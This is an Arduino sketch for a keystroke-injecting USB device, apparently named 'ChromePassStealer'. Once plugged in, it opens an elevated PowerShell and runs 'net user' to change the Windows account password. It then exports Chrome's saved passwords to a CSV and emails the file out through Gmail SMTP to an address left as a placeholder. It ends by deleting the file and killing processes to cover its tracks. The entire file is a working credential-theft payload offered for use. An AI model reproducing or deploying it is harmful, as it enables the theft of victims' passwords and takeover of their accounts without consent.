#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  
  Keyboard.begin();

  delay(2500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  // Disable Windows Password

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(3000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(3500);

  Keyboard.print("$env:UserName ");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('-');
  Keyboard.releaseAll();
   
  Keyboard.print(" clip");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("net user ");

  delay(300);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_BACKSPACE);

  delay(150);

  Keyboard.print(" *");

  delay(150);

  typeKey(KEY_RETURN);

  delay(150);

  typeKey(KEY_RETURN);

  delay(150);
  
  typeKey(KEY_RETURN);

  delay(150);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Start Google Chrome and download .csv file

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(250);

  Keyboard.print("chrome");

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print("chrome://settings/passwords");

  typeKey(KEY_RETURN);

  delay(1500);

  typeKey(KEY_TAB);

  delay(50);

  typeKey(KEY_TAB);

  delay(50);

  typeKey(KEY_TAB);

  delay(50);

  typeKey(KEY_TAB);

  delay(50);

  typeKey(KEY_TAB);

  delay(50);

  typeKey(KEY_TAB);

  delay(50);

  typeKey(KEY_TAB);

  delay(50);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.print("C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Public");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Documents");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("pass");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  // Send .csv file by mail

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  // Replace "email", and "PASSWORD" by your email name and password

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(175);
  Keyboard.releaseAll();
  
  Keyboard.print("gmail.com', 'PASSWORD')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.From = 'email");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(175);
  Keyboard.releaseAll();
  
  Keyboard.print("gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.To.Add('email");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(175);
  Keyboard.releaseAll();
  
  Keyboard.print("gmail.com')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Subject = 'ChromePassStealer'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Body = 'Attached is your list of passwords.'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Attachments.Add('");

  Keyboard.print("C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Public");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Documents");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("pass.csv')");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  delay(3500);

  // Delete .csv file

  Keyboard.print("taskkill -f /im chrome.exe");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("taskkill -f /im powershell.exe");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("del C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Public");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Documents");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("pass.csv");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
